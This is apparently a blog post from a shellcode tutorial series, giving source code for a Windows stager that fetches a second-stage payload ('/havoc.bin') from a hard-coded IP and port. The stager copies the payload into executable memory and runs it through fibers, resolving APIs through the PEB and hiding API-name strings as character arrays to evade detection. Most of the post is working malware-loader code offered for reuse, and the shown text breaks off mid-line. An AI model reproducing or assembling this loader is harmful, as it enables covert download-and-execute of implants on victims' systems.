# https://oblivion-malware.xyz/posts/shellcode-pt4-stager-local-inject-fibers/

<!DOCTYPE html><html lang="en"><body><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Shellcode - Pt 4: Stager + Local Injection using Fibers</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h1 id="project-architecture">Project Architecture</h1><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre>.
â”œâ”€â”€ bin
â”‚&nbsp;&nbsp; â””â”€â”€ shellcode.exe
â”œâ”€â”€ include
â”‚&nbsp;&nbsp; â”œâ”€â”€ common.h
â”‚&nbsp;&nbsp; â”œâ”€â”€ core
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ fibers.h
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ transport.h
â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ win32.h
â”‚&nbsp;&nbsp; â””â”€â”€ structs.h
â”œâ”€â”€ makefile
â”œâ”€â”€ scripts
â”‚&nbsp;&nbsp; â””â”€â”€ extract.py
â””â”€â”€ src
    â”œâ”€â”€ asm
    â”‚&nbsp;&nbsp; â””â”€â”€ entry.asm
    â”œâ”€â”€ core
    â”‚&nbsp;&nbsp; â”œâ”€â”€ fibers.c
    â”‚&nbsp;&nbsp; â”œâ”€â”€ mem.c
    â”‚&nbsp;&nbsp; â”œâ”€â”€ strman.c
    â”‚&nbsp;&nbsp; â”œâ”€â”€ transport.c
    â”‚&nbsp;&nbsp; â””â”€â”€ win32.c
    â””â”€â”€ main.c
</pre></td></tr></tbody></table></code></div></div><ul><li>WinMain - This is entrypoint writed in NASM. Its located in src/asm/entry.asm.</li><li>Main - Pre entrypoint in C. Its located in src/main.c.</li><li>LdrModuleAddr - is a function that takes the name of a module and traverses the Process Environment Block (PEB) to fetch its address. Explained in â€¦ . Its located in src/core/win32.c.</li><li>LdrFuncAddr - is a function that takes the address of a module and the name of a function, then retrieves the address of an exported function through its Portable Executable (PE) header. Explained in â€¦ . Its located in src/core/win32.c.</li><li>INSTANCE - is a structure that will hold the addresses of the modules and functions that will be utilized. Its located in include/core/win32.h.</li><li>InitInstance - is a function that initializes the INSTANCE structure using the previously mentioned functions, LdrModuleAddr and LdrFuncAddr. Its located in src/core/win32.c.</li><li>ExecViaFibers - is a function responsible for executing the payload, Its located in src/core/fibers.c.</li><li>StagerReceive - is a function responsible for making the request and reading the main payload from a web server. Its located in src/core/transport.c.</li></ul><p>The code contains custom memory copy functions, ANSI and UNICODE string comparison functions, as well as type casting, which I wonâ€™t explain here. Its located in src/core/strman.c, src/core/mem.c and exported in include/common.h</p><h2 id="winmain"><span class="me-2">WinMain</span><a href="https://oblivion-malware.xyz/posts/shellcode-pt4-stager-local-inject-fibers/#winmain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>WinMain is the function that aligns the stack according to the calling convention. Without this, it would be impossible because it needs to be cleaned and aligned to 16 bytes. To learn more, visit: https://learn.microsoft.com/en-us/cpp/build/stack-usage?view=msvc-170#stack-allocation.</p><p>Below, I will show the code responsible for performing the alignment.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>section .text                  
global WinMain

EXTERN Main
WinMain:                         
    push rsi                      
    mov  rsi, rsp                 
    and  rsp, 0xFFFFFFFFFFFFFFF0  
    sub  rsp, 0x20                
    call Main                     
    mov  rsp, rsi                 
    pop  rsi                      
    ret                           
</pre></td></tr></tbody></table></code></div></div><p>As seen, the Main function is called inside our WinMain.</p><h2 id="main"><span class="me-2">Main</span><a href="https://oblivion-malware.xyz/posts/shellcode-pt4-stager-local-inject-fibers/#main" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The function responsible for handling all functionalities of the code is where we declare the INSTANCE, initialize it, also where we have the Host, Port, Path, and usage of the Http call functions and payload execution. If used, its necessary to change the Host, Port, and Path according to your context.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;common.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;core/win32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;core/fibers.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;core/transport.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">Main</span><span class="p">(){</span>

    <span class="n">INSTANCE</span> <span class="n">Instance</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">InitInstance</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Instance</span><span class="p">);</span>

    <span class="n">WCHAR</span> <span class="n">Host</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"192.168.0.101"</span><span class="p">;</span>
    <span class="kt">int</span>   <span class="n">Port</span>   <span class="o">=</span> <span class="mi">7777</span><span class="p">;</span>
    <span class="n">WCHAR</span> <span class="n">Path</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"/havoc.bin"</span><span class="p">;</span>

	<span class="n">DWORD</span> <span class="n">Bs</span><span class="p">;</span>
	<span class="n">PBYTE</span> <span class="n">Bt</span><span class="p">;</span>
    <span class="n">StagerReceive</span><span class="p">(</span> <span class="n">Instance</span><span class="p">,</span> <span class="n">Host</span><span class="p">,</span> <span class="n">Port</span><span class="p">,</span> <span class="n">Path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Bt</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Bs</span> <span class="p">);</span>

	<span class="n">PVOID</span> <span class="n">Addr</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">.</span><span class="n">Api</span><span class="p">.</span><span class="n">pVirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">Bs</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
	<span class="n">MemCopy</span><span class="p">(</span><span class="n">Addr</span><span class="p">,</span> <span class="n">Bt</span><span class="p">,</span> <span class="n">Bs</span><span class="p">);</span>

    <span class="n">ExecViaFibers</span><span class="p">(</span> <span class="n">Instance</span><span class="p">,</span> <span class="n">Addr</span> <span class="p">);</span>

<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h2 id="instance"><span class="me-2">INSTANCE</span><a href="https://oblivion-malware.xyz/posts/shellcode-pt4-stager-local-inject-fibers/#instance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Here we have the declaration of the Api structure and the Modules structure inside INSTANCE, with all the functions and modules we will use in our project. In the same file, we have the typing of the APIs being declared.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_INSTANCE</span> <span class="p">{</span>
  
  <span class="k">struct</span> <span class="p">{</span>
    <span class="n">fnRtlAllocateHeap</span>         <span class="n">pRtlAllocateHeap</span><span class="p">;</span>
    <span class="n">fnRtlReAllocateHeap</span>       <span class="n">pRtlReAllocateHeap</span><span class="p">;</span>
    <span class="n">fnRtlFreeHeap</span>             <span class="n">pRtlFreeHeap</span><span class="p">;</span>

    <span class="n">fnCreateFiber</span>             <span class="n">pCreateFiber</span><span class="p">;</span>
    <span class="n">fnSwitchToFiber</span>           <span class="n">pSwitchToFiber</span><span class="p">;</span>
    <span class="n">fnConvertThreadToFiber</span>    <span class="n">pConvertThreadToFiber</span><span class="p">;</span>
    <span class="n">fnLoadLibraryA</span>            <span class="n">pLoadLibraryA</span><span class="p">;</span>
    <span class="n">fnVirtualAlloc</span>            <span class="n">pVirtualAlloc</span><span class="p">;</span>

    <span class="n">fnWinHttpOpen</span>             <span class="n">pWinHttpOpen</span><span class="p">;</span>
    <span class="n">fnWinHttpConnect</span>          <span class="n">pWinHttpConnect</span><span class="p">;</span>
    <span class="n">fnWinHttpOpenRequest</span>      <span class="n">pWinHttpOpenRequest</span><span class="p">;</span>
    <span class="n">fnWinHttpSendRequest</span>      <span class="n">pWinHttpSendRequest</span><span class="p">;</span>
    <span class="n">fnWinHttpReceiveResponse</span>  <span class="n">pWinHttpReceiveResponse</span><span class="p">;</span>
    <span class="n">fnWinHttpReadData</span>         <span class="n">pWinHttpReadData</span><span class="p">;</span>
    <span class="n">fnWinHttpQueryHeaders</span>     <span class="n">pWinHttpQueryHeaders</span><span class="p">;</span>
    <span class="n">fnWinHttpCloseHandle</span>      <span class="n">pWinHttpCloseHandle</span><span class="p">;</span>
  <span class="p">}</span> <span class="n">Api</span><span class="p">;</span>

  <span class="k">struct</span> <span class="p">{</span>
    <span class="n">PVOID</span> <span class="n">Ntdll</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">Kernel32</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">WinHttp</span><span class="p">;</span>
  <span class="p">}</span> <span class="n">Modules</span><span class="p">;</span> 

<span class="p">}</span> <span class="n">INSTANCE</span><span class="p">,</span> <span class="o">*</span><span class="n">PINSTANCE</span><span class="p">;</span> 
</pre></td></tr></tbody></table></code></div></div><h2 id="initinstance"><span class="me-2">InitInstance</span><a href="https://oblivion-malware.xyz/posts/shellcode-pt4-stager-local-inject-fibers/#initinstance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Here, the function returns a pointer to the INSTANCE structure, which is where we will use the reference in the Main function. We have strings in CHAR and WCHAR to keep the value in the text section. We use LdrModuleAddr and LdrFuncAddr to fill in the modules and functions. In the case of WinHttp, itâ€™s necessary to use LoadLibrary because we need to load the DLL into the process. The LdrModuleAddr function can only handle modules already loaded in the current process.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">InitInstance</span><span class="p">(</span> <span class="n">_Out_</span> <span class="n">PINSTANCE</span> <span class="n">pInstance</span><span class="p">){</span>
  <span class="cm">/*--------------------------[ Ntdll ]--------------------------*/</span>

  <span class="n">WCHAR</span>  <span class="n">wNtdll</span><span class="p">[]</span>           <span class="o">=</span> <span class="s">L"ntdll.dll"</span><span class="p">;</span>

  <span class="n">CHAR</span> <span class="n">cRtlAllocateHeap</span><span class="p">[]</span>   <span class="o">=</span> <span class="p">{</span> <span class="sc">'R'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'c'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span> <span class="n">cRtlReAllocateHeap</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'R'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'R'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'c'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span> <span class="n">cRtlFreeHeap</span><span class="p">[]</span>       <span class="o">=</span> <span class="p">{</span> <span class="sc">'R'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'F'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="err">'</span><span class="n">e</span> <span class="err">'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>

  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">Ntdll</span>          <span class="o">=</span> <span class="n">LdrModuleAddr</span><span class="p">(</span><span class="n">wNtdll</span><span class="p">);</span>

  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pRtlAllocateHeap</span>   <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">Ntdll</span><span class="p">,</span> <span class="n">cRtlAllocateHeap</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pRtlReAllocateHeap</span> <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">Ntdll</span><span class="p">,</span> <span class="n">cRtlReAllocateHeap</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pRtlFreeHeap</span>       <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">Ntdll</span><span class="p">,</span> <span class="n">cRtlFreeHeap</span><span class="p">);</span>


  <span class="cm">/*--------------------------[ Kernel32 ]--------------------------*/</span>

  <span class="n">WCHAR</span> <span class="n">wKernel32</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"KERNEL32.DLL"</span><span class="p">;</span>

  <span class="n">CHAR</span>  <span class="n">cVirtualAlloc</span><span class="p">[]</span>           <span class="o">=</span> <span class="p">{</span> <span class="sc">'V'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'u'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span><span class="sc">'l'</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'c'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span>  <span class="n">cCreateFiber</span><span class="p">[]</span>            <span class="o">=</span> <span class="p">{</span> <span class="sc">'C'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'F'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'b'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span>  <span class="n">cConvertThreadToFiber</span><span class="p">[]</span>   <span class="o">=</span> <span class="p">{</span> <span class="sc">'C'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'v'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'T'</span><span class="p">,</span> <span class="sc">'h'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'d'</span><span class="p">,</span> <span class="sc">'T'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'F'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'b'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span>  <span class="n">cSwitchToFiber</span><span class="p">[]</span>          <span class="o">=</span> <span class="p">{</span> <span class="sc">'S'</span><span class="p">,</span> <span class="sc">'w'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'c'</span><span class="p">,</span> <span class="sc">'h'</span><span class="p">,</span> <span class="sc">'T'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'F'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'b'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span>  <span class="n">cLoadLibraryA</span><span class="p">[]</span>           <span class="o">=</span> <span class="p">{</span> <span class="sc">'L'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'d'</span><span class="p">,</span> <span class="sc">'L'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'b'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'y'</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>

  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">Kernel32</span>           <span class="o">=</span> <span class="n">LdrModuleAddr</span><span class="p">(</span><span class="n">wKernel32</span><span class="p">);</span>

  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pVirtualAlloc</span>          <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">,</span> <span class="n">cVirtualAlloc</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pCreateFiber</span>           <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">,</span> <span class="n">cCreateFiber</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pConvertThreadToFiber</span>  <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">,</span> <span class="n">cConvertThreadToFiber</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pSwitchToFiber</span>         <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">,</span> <span class="n">cSwitchToFiber</span><span class="p">);</span>
  <span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Api</span><span class="p">.</span><span class="n">pLoadLibraryA</span>          <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">pInstance</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">,</span> <span class="n">cLoadLibraryA</span><span class="p">);</span>
  <span class="cm">/*--------------------------[ WinHttp ]--------------------------*/</span>

  <span class="n">CHAR</span> <span class="n">cWinHttp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'W'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'.'</span><span class="p">,</span> <span class="sc">'d'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>

  <span class="n">CHAR</span> <span class="n">cWinHttpOpen</span><span class="p">[]</span>            <span class="o">=</span> <span class="p">{</span> <span class="sc">'W'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'O'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span> <span class="n">cWinHttpConnect</span><span class="p">[]</span>         <span class="o">=</span> <span class="p">{</span> <span class="sc">'W'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'C'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'c'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span> <span class="n">cWinHttpOpenRequest</span><span class="p">[]</span>     <span class="o">=</span> <span class="p">{</span> <span class="sc">'W'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'O'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'R'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'q'</span><span class="p">,</span> <span class="sc">'u'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'s'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span> <span class="n">cWinHttpReadData</span><span class="p">[]</span>        <span class="o">=</span> <span class="p">{</span> <span class="sc">'W'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'R'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'d'</span><span class="p">,</span> <span class="sc">'D'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span> <span class="n">cWinHttpReceiveResponse</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'W'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'R'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'c'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'v'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'R'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'s'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'s'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span> <span class="n">cWinHttpSendRequest</span><span class="p">[]</span>     <span class="o">=</span> <span class="p">{</span> <span class="sc">'W'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'S'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'d'</span><span class="p">,</span> <span class="sc">'R'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'q'</span><span class="p">,</span> <span class="sc">'u'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'s'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">CHAR</span> <span class="n">cWinHttpQueryHeaders</span><span class="p">[]</span>    <span class="o">=</span> <span class="p">{</span> <span class="sc">'W'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'p'</span><span class="p">,</span> <span class="sc">'Q'</span><span class="p">,</span> <span class="sc">'u'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'y'</span><span class="p">,</span> <span class="sc">'H'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'d'</span><span class="p">,</span> <span class="sc">'e'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'s'</span><span class="p">,</span> <span class="mi">0</span> <span 